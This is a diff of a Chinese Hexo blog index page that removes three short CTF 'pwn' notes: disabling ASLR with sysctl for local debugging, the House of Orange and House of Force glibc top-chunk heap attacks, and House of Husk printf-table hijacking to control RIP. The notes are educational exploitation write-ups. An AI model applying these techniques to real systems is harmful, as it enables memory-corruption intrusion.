-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">关闭aslr进行调试</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-09-30 16:39:15 / 修改时间：16:40:21" itemprop="dateCreated datePublished" datetime="2023-09-30T16:39:15+08:00">2023-09-30</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>193</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>ASLR是一种随机化保护的方法，linux自带，它使得栈、库、堆等地址随机化，对攻击达到一个干扰的效果</strong></p>
-<p>而在pwn题里面，针对ld的攻击，在ubuntu22.04下不知道为何ld的基址和libc的基址距离一直变化(一般是不变化的，使得我对ld的攻击调试极其不方便</p>
-<p>可以通过linux一条命令 临时关闭aslr，进行调试，不过要注意远程的这个距离和本地的距离一般是不一样的(相差会在第1.5个字节到第2.5个字节之间</p>
-<p>比如0x7ffff7fc3000，所以一般打远程需要爆破两个字节，后面会给出爆破的脚本</p>
-<p>关闭aslr：</p>
-<pre><code class="python">sudo sysctl -w kernel.randomize_va_space=0
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">针对topchunk的攻击</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-09-27 11:00:48 / 修改时间：11:06:15" itemprop="dateCreated datePublished" datetime="2023-09-27T11:00:48+08:00">2023-09-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>414</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House_of_orange"></a>House_of_orange</h2><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>能够修改到top_chunk的size值</p>
-<p>可以得到一个unsortedbin</p>
-<p>glibc ≤ 2.23</p>
-<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>当malloc的值≥0x20000的时候会调用mmap来分配，而低于则会切割top_chunk来分配</p>
-<p>当top_chunk不够分配的时候，会把当前top_chunk释放，然后再重新申请一个大的top_chunk</p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>看top_chunk的size值，比如0x20791这样子</p>
-<p>改为0x791，再申请一个大的即可无中生有一个unsorted bin出来</p>
-<p>随后如果能够修改到unsortedbin的bk位，即可实现unsorted bin attack</p>
-<p>一般后续攻击是挟持IO_list_all指针</p>
-<p>unsorted bin attack实现的是将main_arena+0x88写到IO_list_all处</p>
-<p><img src="/./images/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB%20f1d06547f1eb468f9311541953a1de96/Untitled.png" alt="Untitled"></p>
-<p>此时要控制好main_arena+0x88处的IO_FILE的_chain即可(</p>
-<p>这种攻击是通过abort流攻击的(因为unsorted bin结构被破坏</p>
-<p>当再次申请内存的时候</p>
-<p>调用流为malloc→malloc→printerr→__libc_message→abort()→_IO_flush_all_lockp()→_IO_overflow</p>
-<p>但是2.27以及以后的版本取消了abort刷新流的操作，这个攻击方式就失效了(</p>
-<p>不过释放到unsorted bin这一步之前还是可以的</p>
-<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><h3 id="攻击条件-1"><a href="#攻击条件-1" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>能够修改到topchunk的size值</p>
-<p>glibc ≤ 2.29</p>
-<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>修改top_chunk的size为-1，能过过掉校验</p>
-<p>然后可以通过申请内存，将top_chunk推至指定内存空间，然后malloc即可申请到那部分内存</p>
-<p>由于2.29及其以前使用，常用在2.27+的时候，可以小范围将top_chunk推至tcache struct结构体里，修改entry_point实现tcache posioning attack</p>
-<p>因为是相对位移，<strong>所以不需要leak出堆地址。</strong></p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>比如当前top_chunk_addr &#x3D; 0x501000</p>
-<p>malloc(-0x1000)即可将top_chunk_addr推至0x500000附近</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/26/house-of-husk/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/26/house-of-husk/" class="post-title-link" itemprop="url">house_of_husk</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-09-26 23:50:24" itemprop="dateCreated datePublished" datetime="2023-09-26T23:50:24+08:00">2023-09-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-27 11:02:26" itemprop="dateModified" datetime="2023-09-27T11:02:26+08:00">2023-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>273</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>house_of_husk是针对带格式化字符输出printf函数的一种攻击</p>
-<p>可以实现控制rip</p>
-<p>适用版本2.23-至今</p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p><strong>printf会输出前检查是否有自定义格式化字符</strong></p>
-<p>方法是通过两个表：</p>
-<ul>
-<li>__printf_function_table</li>
-<li>__printf_arginfo_table</li>
-</ul>
-<ol>
-<li>先将__printf_function_table的值置为非空</li>
-</ol>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled.png" alt="Untitled"></p>
-<ol>
-<li>然后将__printf_arginfo_table挟持到我们可控的地址</li>
-</ol>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%201.png" alt="Untitled"></p>
-<p><del>往可控的地方写值，这个有讲究(</del></p>
-<p>最终会调用到__printf_arginfo_table[index]</p>
-<p>这个index和格式化字符的有关：</p>
-<p>比如%d → ord(’d’) → 100</p>
-<p>%s → ord(’s’) → 115</p>
-<p>所以挟持__printf_arginfo_table的时候，比如格式化字符是%d</p>
-<p>那我们就弄成&#x3D;</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__printf_arginfo_table = control_addr - ord(<span class="string">&#x27;d&#x27;</span>)*<span class="number">8</span></span><br></pre></td></tr></table></figure>
-
-<p>然后往control_addr里面写入RIP即可</p>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%202.png" alt="Untitled"></p>
-<p>其控制流为：</p>
-<p>printf→vfprintf→printf_positional→__parse_one_specmb→RIP</p>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>printf会检查是否有自定义格式化字符(检查的就是__printf_function_table是否为空，如果不为空，则代表有自定义格式化字符，然后就会放弃默认输出方式，而去找__printf_arginfo_table里面的调用函数</p>
-<p>将此两表挟持，即可成功控制RIP</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1660,7 +1720,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1673,7 +1733,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-count">39</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1718,13 +1778,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">45k</span>
+    <span title="站点总字数">51k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:45</span>
+    <span title="站点阅读时长">3:07</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
